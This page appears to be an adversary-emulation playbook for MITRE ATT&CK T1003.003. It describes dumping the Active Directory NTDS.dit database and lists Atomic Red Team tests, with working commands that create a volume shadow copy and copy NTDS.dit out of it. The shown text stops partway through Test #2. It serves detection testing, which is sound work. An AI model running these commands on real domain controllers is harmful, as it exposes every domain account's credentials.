

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta charset="utf-8" />
    <title>T1003.003 - OS Credential Dumping: NTDS &#8212; The Atomic Playbook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <link href="../../_static/css/index.css" rel="stylesheet">
    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/language_data.js"></script>
    <script src="../../_static/togglebutton.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script src="../../_static/mystnb.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="T1003.001 - OS Credential Dumping: LSASS Memory" href="T1003.001.html" />
    <link rel="prev" title="T1003 - OS Credential Dumping" href="T1003.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="docsearch:language" content="en">



  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="../../index.html">
  
  <img src="../../_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
  
</a>
</div>

<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>

<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
  <ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../intro.html">
   Welcome to the Atomic Playbook
  </a>
 </li>
</ul>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../initial-access.html">
   Initial Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../execution.html">
   Execution
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../persistence.html">
   Persistence
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../privilege-escalation.html">
   Privilege Escalation
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../defense-evasion.html">
   Defense Evasion
  </a>
 </li>
 <li class="toctree-l1 current active">
  <a class="reference internal" href="../credential-access.html">
   Credential Access
  </a>
  <ul class="current">
   <li class="toctree-l2">
    <a class="reference internal" href="T1056.001.html">
     T1056.001 - Input Capture: Keylogging
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1110.001.html">
     T1110.001 - Brute Force: Password Guessing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1111.html">
     T1111 - Two-Factor Authentication Interception
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1111.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1212.html">
     T1212 - Exploitation for Credential Access
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1212.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1110.003.html">
     T1110.003 - Brute Force: Password Spraying
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1056.003.html">
     T1056.003 - Web Portal Capture
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1056.html">
     T1056 - Input Capture
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1056.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1556.003.html">
     T1556.003 - Pluggable Authentication Modules
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1556.001.html">
     T1556.001 - Domain Controller Authentication
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1539.html">
     T1539 - Steal Web Session Cookie
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1539.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1558.html">
     T1558 - Steal or Forge Kerberos Tickets
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1558.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.008.html">
     T1003.008 - /etc/passwd and /etc/shadow
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1110.002.html">
     T1110.002 - Password Cracking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1056.002.html">
     T1056.002 - Input Capture: GUI Input Capture
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1110.html">
     T1110 - Brute Force
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1110.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1056.004.html">
     T1056.004 - Input Capture: Credential API Hooking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1110.004.html">
     T1110.004 - Credential Stuffing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1557.001.html">
     T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1556.002.html">
     T1556.002 - Modify Authentication Process: Password Filter DLL
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1557.html">
     T1557 - Man-in-the-Middle
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1557.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.003.html">
     T1552.003 - Unsecured Credentials: Bash History
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.001.html">
     T1552.001 - Unsecured Credentials: Credentials In Files
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1555.html">
     T1555 - Credentials from Password Stores
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1555.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1040.html">
     T1040 - Network Sniffing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1040.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.002.html">
     T1003.002 - OS Credential Dumping: Security Account Manager
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1558.002.html">
     T1558.002 - Silver Ticket
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.006.html">
     T1003.006 - DCSync
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.005.html">
     T1552.005 - Cloud Instance Metadata API
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1555.002.html">
     T1555.002 - Securityd Memory
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.004.html">
     T1003.004 - OS Credential Dumping: LSA Secrets
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.html">
     T1003 - OS Credential Dumping
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     T1003.003 - OS Credential Dumping: NTDS
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.001.html">
     T1003.001 - OS Credential Dumping: LSASS Memory
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.002.html">
     T1552.002 - Unsecured Credentials: Credentials in Registry
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1187.html">
     T1187 - Forced Authentication
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1187.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1556.html">
     T1556 - Modify Authentication Process
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1556.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.006.html">
     T1552.006 - Unsecured Credentials: Group Policy Preferences
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1555.003.html">
     T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.html">
     T1552 - Unsecured Credentials
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.005.html">
     T1003.005 - Cached Domain Credentials
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1558.001.html">
     T1558.001 - Golden Ticket
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1003.007.html">
     T1003.007 - Proc Filesystem
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1558.003.html">
     T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1552.004.html">
     T1552.004 - Unsecured Credentials: Private Keys
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1555.001.html">
     T1555.001 - Credentials from Password Stores: Keychain
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1528.html">
     T1528 - Steal Application Access Token
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1528.html#shield-active-defense">
     Shield Active Defense
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../discovery.html">
   Discovery
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../lateral-movement.html">
   Lateral Movement
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../collection.html">
   Collection
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../command-and-control.html">
   Command and Control
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../exfiltration.html">
   Exfiltration
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../impact.html">
   Impact
  </a>
 </li>
</ul>

</nav>

 <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        <div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    
    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../_sources/tactics/credential-access/T1003.003.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.ipynb</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
    
</div>
        <!-- Source interaction buttons -->


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#atomic-tests">
   Atomic Tests
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-1-create-volume-shadow-copy-with-ntds-dit">
     Atomic Test #1 - Create Volume Shadow Copy with NTDS.dit
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#dependencies-run-with-none">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         None
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-target-must-be-a-domain-controller">
         Description: Target must be a Domain Controller
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#check-prereq-commands">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#get-prereq-commands">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-2-copy-ntds-dit-from-volume-shadow-copy">
     Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id1">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         None
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id2">
         Description: Target must be a Domain Controller
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id3">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id4">
         Get Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-volume-shadow-copy-must-exist">
         Description: Volume shadow copy must exist
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id5">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id6">
         Get Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-extract-path-must-exist">
         Description: Extract path must exist
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id7">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id8">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id9">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-3-dump-active-directory-database-with-ntdsutil">
     Atomic Test #3 - Dump Active Directory Database with NTDSUtil
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id10">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         None
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id11">
         Description: Target must be a Domain Controller
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id12">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id13">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id14">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-4-create-volume-shadow-copy-with-wmi">
     Atomic Test #4 - Create Volume Shadow Copy with WMI
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id15">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         None
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id16">
         Description: Target must be a Domain Controller
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id17">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id18">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id19">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-5-create-volume-shadow-copy-with-powershell">
     Atomic Test #5 - Create Volume Shadow Copy with Powershell
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-6-create-symlink-to-volume-shadow-copy">
     Atomic Test #6 - Create Symlink to Volume Shadow Copy
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id20">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
 </li>
</ul>

        </nav>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="t1003-003-os-credential-dumping-ntds">
<h1>T1003.003 - OS Credential Dumping: NTDS<a class="headerlink" href="#t1003-003-os-credential-dumping-ntds" title="Permalink to this headline">¶</a></h1>
<p>Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)</p>
<p>In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)</p>
<p>The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.</p>
<ul class="simple">
<li><p>Volume Shadow Copy</p></li>
<li><p>secretsdump.py</p></li>
<li><p>Using the in-built Windows tool, ntdsutil.exe</p></li>
<li><p>Invoke-NinjaCopy</p></li>
</ul>
<div class="section" id="atomic-tests">
<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
<span class="c1"># Checkout Jupyter Notebook at https://github.com/haresudhan/TheAtomicPlaybook to run PS scripts.</span>
<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="atomic-test-1-create-volume-shadow-copy-with-ntds-dit">
<h3>Atomic Test #1 - Create Volume Shadow Copy with NTDS.dit<a class="headerlink" href="#atomic-test-1-create-volume-shadow-copy-with-ntds-dit" title="Permalink to this headline">¶</a></h3>
<p>This test is intended to be run on a domain Controller.</p>
<p>The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="dependencies-run-with-none">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#dependencies-run-with-none" title="Permalink to this headline">¶</a></h4>
<div class="section" id="description-target-must-be-a-domain-controller">
<h5>Description: Target must be a Domain Controller<a class="headerlink" href="#description-target-must-be-a-domain-controller" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="check-prereq-commands">
<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

</pre></div>
</div>
</div>
<div class="section" id="get-prereq-commands">
<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo Sorry, Promoting this machine to a Domain Controller must be done manually

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="attack-commands-run-with-command-prompt">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>vssadmin.exe create shadow /for=C:
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-2-copy-ntds-dit-from-volume-shadow-copy">
<h3>Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy<a class="headerlink" href="#atomic-test-2-copy-ntds-dit-from-volume-shadow-copy" title="Permalink to this headline">¶</a></h3>
<p>This test is intended to be run on a domain Controller.</p>
<p>The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.</p>
<p>This test requires steps taken in the test “Create Volume Shadow Copy with NTDS.dit”.
A successful test also requires the export of the SYSTEM Registry hive.
This test must be executed on a Windows Domain Controller.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="id1">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
<div class="section" id="id2">
<h5>Description: Target must be a Domain Controller<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id3">
<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

</pre></div>
</div>
</div>
<div class="section" id="id4">
<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo Sorry, Promoting this machine to a Domain Controller must be done manually

</pre></div>
</div>
</div>
<div class="section" id="description-volume-shadow-copy-must-exist">
<h5>Description: Volume shadow copy must exist<a class="headerlink" href="#description-volume-shadow-copy-must-exist" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id5">
<h5>Check Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if not exist \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 (exit /b 1)

</pre></div>
</div>
</div>
<div class="section" id="id6">
<h5>Get Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo Run &quot;Invoke-AtomicTest T1003.003 -TestName &#39;Create Volume Shadow Copy with NTDS.dit&#39;&quot; to fulfuill this requirement

</pre></div>
</div>
</div>
<div class="section" id="description-extract-path-must-exist">
<h5>Description: Extract path must exist<a class="headerlink" href="#description-extract-path-must-exist" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id7">
<h5>Check Prereq Commands:<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if not exist C:\Windows\Temp (exit /b 1)

</pre></div>
</div>
</div>
<div class="section" id="id8">
<h5>Get Prereq Commands:<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>mkdir C:\Windows\Temp

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id9">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
